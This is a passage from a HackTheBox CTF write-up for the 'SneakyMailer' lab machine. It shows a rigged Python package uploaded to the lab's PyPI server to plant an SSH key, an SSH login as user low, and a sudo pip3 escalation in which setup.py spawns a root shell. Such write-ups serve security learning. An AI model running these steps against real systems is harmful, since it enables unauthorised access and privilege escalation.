    <span class="n">setup</span><span class="p">(</span>
    <span class="n">name</span><span class="o">=</span><span class="s">'cfx-key'</span><span class="p">,</span>
    <span class="n">packages</span><span class="o">=</span><span class="p">[</span><span class="s">'cfx-key'</span><span class="p">],</span>
    <span class="n">description</span><span class="o">=</span><span class="s">'Hello world enterprise edition'</span><span class="p">,</span>
    <span class="n">version</span><span class="o">=</span><span class="s">'0.1'</span><span class="p">,</span>
    <span class="n">url</span><span class="o">=</span><span class="s">'http://sneakycorp.htb'</span><span class="p">,</span>
    <span class="n">author</span><span class="o">=</span><span class="s">'coldfusionx'</span><span class="p">,</span>
    <span class="n">author_email</span><span class="o">=</span><span class="s">'coldfusionx@htb'</span><span class="p">,</span>
    <span class="n">keywords</span><span class="o">=</span><span class="p">[</span><span class="s">'pip'</span><span class="p">,</span><span class="s">'cfx-key'</span><span class="p">,</span><span class="s">'example'</span><span class="p">]</span>
    <span class="p">)</span>
</pre></table></code></div></div><ul><li>Step4: Creating Package</li></ul><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre>www-data@sneakymailer:/tmp/coldfx<span class="nv">$ </span>python3 setup.py sdist
running sdist
running egg_info
creating cfx_key.egg-info
writing cfx_key.egg-info/PKG-INFO
writing dependency_links to cfx_key.egg-info/dependency_links.txt
writing top-level names to cfx_key.egg-info/top_level.txt
writing manifest file <span class="s1">'cfx_key.egg-info/SOURCES.txt'</span>
reading manifest file <span class="s1">'cfx_key.egg-info/SOURCES.txt'</span>
writing manifest file <span class="s1">'cfx_key.egg-info/SOURCES.txt'</span>
running check
creating cfx-key-0.1
creating cfx-key-0.1/cfx-key
creating cfx-key-0.1/cfx_key.egg-info
copying files to cfx-key-0.1...
copying README.md -&gt; cfx-key-0.1
copying setup.cfg -&gt; cfx-key-0.1
copying setup.py -&gt; cfx-key-0.1
copying cfx-key/__init__.py -&gt; cfx-key-0.1/cfx-key
copying cfx_key.egg-info/PKG-INFO -&gt; cfx-key-0.1/cfx_key.egg-info
copying cfx_key.egg-info/SOURCES.txt -&gt; cfx-key-0.1/cfx_key.egg-info
copying cfx_key.egg-info/dependency_links.txt -&gt; cfx-key-0.1/cfx_key.egg-info
copying cfx_key.egg-info/top_level.txt -&gt; cfx-key-0.1/cfx_key.egg-info
Writing cfx-key-0.1/setup.cfg
creating dist
Creating <span class="nb">tar </span>archive
removing <span class="s1">'cfx-key-0.1'</span> <span class="o">(</span>and everything under it<span class="o">)</span>
</pre></table></code></div></div><ul><li>Step 5: Uploading Package</li></ul><p>Before uploading package we need to ensure <code class="language-plaintext highlighter-rouge">.pypirc</code> is present inside the home directory, so we’ll define our current directory as home.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>www-data@sneakymailer:/tmp/coldfx<span class="nv">$ </span><span class="nb">export </span><span class="nv">HOME</span><span class="o">=</span>/tmp/coldfx
www-data@sneakymailer:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$HOME</span>
/tmp/coldfx
</pre></table></code></div></div><p>So now basically we are /tmp/coldfx is the home directory.</p><h4 id="uploading">Uploading</h4><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre><td class="rouge-code"><pre>www-data@sneakymailer:~<span class="nv">$ </span>python3 setup.py sdist upload <span class="nt">-r</span> cfx-key
running sdist
running egg_info
writing cfx_key.egg-info/PKG-INFO
writing dependency_links to cfx_key.egg-info/dependency_links.txt
writing top-level names to cfx_key.egg-info/top_level.txt
reading manifest file <span class="s1">'cfx_key.egg-info/SOURCES.txt'</span>
writing manifest file <span class="s1">'cfx_key.egg-info/SOURCES.txt'</span>
running check
creating cfx-key-0.1
creating cfx-key-0.1/cfx-key
creating cfx-key-0.1/cfx_key.egg-info
copying files to cfx-key-0.1...
copying README.md -&gt; cfx-key-0.1
copying setup.cfg -&gt; cfx-key-0.1
copying setup.py -&gt; cfx-key-0.1
copying cfx-key/__init__.py -&gt; cfx-key-0.1/cfx-key
copying cfx_key.egg-info/PKG-INFO -&gt; cfx-key-0.1/cfx_key.egg-info
copying cfx_key.egg-info/SOURCES.txt -&gt; cfx-key-0.1/cfx_key.egg-info
copying cfx_key.egg-info/dependency_links.txt -&gt; cfx-key-0.1/cfx_key.egg-info
copying cfx_key.egg-info/top_level.txt -&gt; cfx-key-0.1/cfx_key.egg-info
Writing cfx-key-0.1/setup.cfg
Creating <span class="nb">tar </span>archive
removing <span class="s1">'cfx-key-0.1'</span> <span class="o">(</span>and everything under it<span class="o">)</span>
running upload
Submitting dist/cfx-key-0.1.tar.gz to http://pypi.sneakycorp.htb:8080
Server response <span class="o">(</span>200<span class="o">)</span>: OK
WARNING: Uploading via this <span class="nb">command </span>is deprecated, use twine to upload instead <span class="o">(</span>https://pypi.org/p/twine/<span class="o">)</span>
</pre></table></code></div></div><h3 id="ssh-as-low">SSH as low</h3><p>We can confirm if our ssh was successfully written inside the ssh directory of user low:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>www-data@sneakymailer:~<span class="nv">$ </span><span class="nb">cat</span> /home/low/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC+OOk/amwKEW/gfCikP+y0hqTkgXyICKUegxd2bZCr7CdbACbL+zJn9cV6T4XutmP6JOetxFytws9yO01X2kxkRRhIKH8DFpall5smoaJ1biwOsd6QHQJ7QLsMQIyzhy2qbq1rmi9ubSagBU9qmV4XbQwIM8fpapyV+cWZjvbdJWNVN5ofUBsobDL80GrzqHyde8Luijn2wsYa8/sfLtkNcvA251p20CV+Vbn7Pb72RTG/[..SNIP..]J3BAqVKtdqp4x6iVPlFaxaujgrM<span class="o">=</span> root@cfx
</pre></table></code></div></div><p>Now we can SSH as low using our private key:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>cfx:  ~/Documents/htb/sneakymailer
→ ssh <span class="nt">-i</span> cfx-key low@10.10.10.197
Linux sneakymailer 4.19.0-9-amd64 <span class="c">#1 SMP Debian 4.19.118-2 (2020-04-29) x86_64</span>

The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
No mail.
Last login: Tue Jun  9 03:02:52 2020 from 192.168.56.105

low@sneakymailer:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>low<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>low<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>low<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,25<span class="o">(</span>floppy<span class="o">)</span>,29<span class="o">(</span>audio<span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,44<span class="o">(</span>video<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,109<span class="o">(</span>netdev<span class="o">)</span>,111<span class="o">(</span>bluetooth<span class="o">)</span>,119<span class="o">(</span>pypi-pkg<span class="o">)</span>

low@sneakymailer:~<span class="nv">$ </span><span class="nb">whoami
</span>low
</pre></table></code></div></div><h4 id="grabbing-usertxt">Grabbing user.txt</h4><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>low@sneakymailer:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
646719dd8b4f89<span class="k">******************</span>

</pre></table></code></div></div><h2 id="elevating-priv-low---root">Elevating Priv: low -&gt; root</h2><p>Checking out our sudo privileges using <code class="language-plaintext highlighter-rouge">sudo -l</code> results our next privilege escalation vector:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>low@sneakymailer:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span>: unable to resolve host sneakymailer: Temporary failure <span class="k">in </span>name resolution
Matching Defaults entries <span class="k">for </span>low on sneakymailer:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User low may run the following commands on sneakymailer:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/pip3
</pre></table></code></div></div><p>With reference to <a href="https://gtfobins.github.io/gtfobins/pip/"><strong>gtfo</strong></a> we can escalate to root:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>low@sneakymailer:~<span class="nv">$ TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-d</span><span class="si">)</span>
low@sneakymailer:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"import os; os.execl('/bin/sh', 'sh', '-c', 'sh &lt;</span><span class="si">$(</span><span class="nb">tty</span><span class="si">)</span><span class="s2"> &gt;</span><span class="si">$(</span><span class="nb">tty</span><span class="si">)</span><span class="s2"> 2&gt;</span><span class="si">$(</span><span class="nb">tty</span><span class="si">)</span><span class="s2">')"</span> <span class="o">&gt;</span> <span class="nv">$TF</span>/setup.py
low@sneakymailer:~<span class="nv">$ </span><span class="nb">sudo </span>pip3 <span class="nb">install</span> <span class="nv">$TF</span>
<span class="nb">sudo</span>: unable to resolve host sneakymailer: Temporary failure <span class="k">in </span>name resolution
Processing /tmp/tmp.naFm00Qgl3
<span class="c"># id</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
<span class="c"># whoami</span>
root
</pre></table></code></div></div><h4 id="grabbing-roottxt">Grabbing root.txt</h4><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="c"># cat /root/root.txt</span>
a311d05bde9ed4<span class="k">******************</span>

</pre></table></code></div></div><p>And we pwned the Box !</p><p>Thanks for reading, Suggestions &amp; Feedback are appreciated !</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>HackTheBox</a>, <a href='/categories/linux-machines/'>Linux Machines</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a> <a href="/tags/sneakymailer/" class="post-tag no-text-decoration" >sneakymailer</a> <a href="/tags/ctf/" class="post-tag no-text-decoration" >ctf</a> <a href="/tags/smtp/" class="post-tag no-text-decoration" >smtp</a> <a href="/tags/imap/" class="post-tag no-text-decoration" >imap</a> <a href="/tags/phishing/" class="post-tag no-text-decoration" >phishing</a> <a href="/tags/ffuf/" class="post-tag no-text-decoration" >ffuf</a> <a href="/tags/masscan/" class="post-tag no-text-decoration" >masscan</a> <a href="/tags/swaks/" class="post-tag no-text-decoration" >swaks</a> <a href="/tags/thunderbird/" class="post-tag no-text-decoration" >thunderbird</a> <a href="/tags/ftp/" class="post-tag no-text-decoration" >ftp</a> <a href="/tags/reverse-shell/" class="post-tag no-text-decoration" >reverse-shell</a> <a href="/tags/pypi/" class="post-tag no-text-decoration" >pypi</a> <a href="/tags/nginx/" class="post-tag no-text-decoration" >nginx</a> <a href="/tags/htpasswd/" class="post-tag no-text-decoration" >htpasswd</a> <a href="/tags/python3/" class="post-tag no-text-decoration" >python3</a> <a href="/tags/pip3/" class="post-tag no-text-decoration" >pip3</a> <a href="/tags/ssh/" class="post-tag no-text-decoration" >SSH</a> <a href="/tags/subdomain/" class="post-tag no-text-decoration" >subdomain</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><!-- Post sharing snippet v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HackTheBox — SneakyMailer Writeup - b3t4m3&url=http://localhost:4000/posts/SneakyMailer-HTB/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HackTheBox — SneakyMailer Writeup - b3t4m3&u=http://localhost:4000/posts/SneakyMailer-HTB/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HackTheBox — SneakyMailer Writeup - b3t4m3&url=http://localhost:4000/posts/SneakyMailer-HTB/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><!-- The Pannel on right side (Desktop views) v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"><h3 data-toc-skip>Recent Update</h3><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/PassageHTB/">HackTheBox — Passage Writeup</a></li><li><a href="/posts/Doctor-HTB/">HackTheBox — Doctor Writeup</a></li><li><a href="/posts/Omni-HTB/">HackTheBox — Omni Writeup</a></li><li><a href="/posts/OpenKeys-HTB/">HackTheBox — OpenKeyS Writeup</a></li><li><a href="/posts/SneakyMailer-HTB/">HackTheBox — SneakyMailer Writeup</a></li></ul></div><div id="access-tags"><h3 data-toc-skip>Trending Tags</h3><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ffuf/">ffuf</a> <a class="post-tag" href="/tags/masscan/">masscan</a> <a class="post-tag" href="/tags/nmap/">nmap</a> <a class="post-tag" href="/tags/vhost/">vhost</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/smbclient/">smbclient</a> <a class="post-tag" href="/tags/crackmapexec/">crackmapexec</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><h3 data-toc-skip class="pl-3 pt-2 mb-2">Contents</h3><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <!-- Recommend the other 3 posts according to the tags and categories of the current post, if the number is not enough, use the other latest posts to supplement. v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung Published under the MIT License --><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Cache-HTB/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Oct 16, 2020 <i class="unloaded">2020-10-16T12:20:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox — Cache Writeup</h3><div class="text-muted small"><p> Cache was a fun box, Initial web enumeration leads us to hardcoded credentials stored inside simple login page which uses client side validation, then discover a new VHost running a vulnerable i...</p></div></div></a></div><div class="card"> <a href="/posts/Blunder-HTB/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Oct 23, 2020 <i class="unloaded">2020-10-23T12:20:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox — Blunder Writeup</h3><div class="text-muted small"><p> Blunder was an cool box with two interdependent web application vulnerabilities, Starting off with Web Enumeration we discover a blog hosted on Bludit CMS, going through Github releases indicate...</p></div></div></a></div><div class="card"> <a href="/posts/LaboratoryHTB/"><div class="card-body"> <!-- Date format snippet v2.4.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --> <span class="timeago small" > Apr 23, 2021 <i class="unloaded">2021-04-23T14:40:00+05:30</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HackTheBox — Laboratory Writeup</h3><div class="text-muted small"><p> Laboratory starts off with discovering an vulnerable GitLab instance running on the box. We’ll refer an HackerOne report to exploit a CVE associated with it to get Arbitrary file read vulnerabil...</p></div></div></a></div></div></div><!-- Navigation buttons at the bottom of the post. v2.1 https://github.com/cotes2020/jekyll-theme-chirpy © 2020 Cotes Chung MIT License --><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Buff-HTB/" class="btn btn-outline-primary"><p>HackTheBox — Buff Writeup</p></a> <a href="/posts/OpenKeys-HTB/" class="btn btn-outline-primary"><p>HackTheBox — OpenKeyS Writeup</p></a></div><!-- The Disqus lazy loading. Powered by: https://osvaldas.info/lazy-loading-disqus-comments v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2019 Cotes Chung MIT License --><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//coldfx.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'http://localhost:4000/posts/SneakyMailer-HTB/'; this.page.identifier = '/posts/SneakyMailer-HTB/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="ColdFusionX" data-description="Your Support means the World to me !" data-message="Thank you for visiting. Hope you liked my Blog!" data-color="#5F7FFF" data-position="" data-x_margin="18" data-y_margin="18"></script> <!-- The Footer v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2022 <a href="">Carlos Sequeira</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span> <script src="https://www.hackthebox.eu/badge/163155"></script></p></div><div class="footer-right"><p class="mb-0"><h4>Realm of Knowledge</h4></p></div></div></footer></div><!-- The Search results v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/php/">php</a> <a class="post-tag" href="/tags/ffuf/">ffuf</a> <a class="post-tag" href="/tags/masscan/">masscan</a> <a class="post-tag" href="/tags/nmap/">nmap</a> <a class="post-tag" href="/tags/vhost/">vhost</a> <a class="post-tag" href="/tags/ssh/">ssh</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/sudo/">sudo</a> <a class="post-tag" href="/tags/smbclient/">smbclient</a> <a class="post-tag" href="/tags/crackmapexec/">crackmapexec</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <!-- Jekyll Simple Search loader v2.0 https://github.com/cotes2020/jekyll-theme-chirpy © 2017-2019 Cotes Chung MIT License --> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="http://localhost:4000{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"><div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>{categories}</div><div><i class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script>
